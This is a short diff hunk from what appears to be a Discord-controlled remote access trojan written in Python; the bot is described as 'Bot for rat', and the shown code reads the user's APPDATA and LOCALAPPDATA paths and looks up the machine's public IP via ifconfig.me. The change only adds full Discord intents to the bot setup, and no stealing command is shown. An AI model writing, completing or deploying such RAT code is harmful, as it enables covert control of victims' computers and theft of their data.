@@ -30,7 +30,7 @@ appdatar = os.environ["APPDATA"]
 appdatal = os.environ["LOCALAPPDATA"]
 i = requests.get("https://ifconfig.me")
 
-client = commands.Bot(command_prefix=")", description="Bot for rat")
+client = commands.Bot(command_prefix=")", intents=discord.Intents.all(), description="Bot for rat")
 
 
 @client.command()
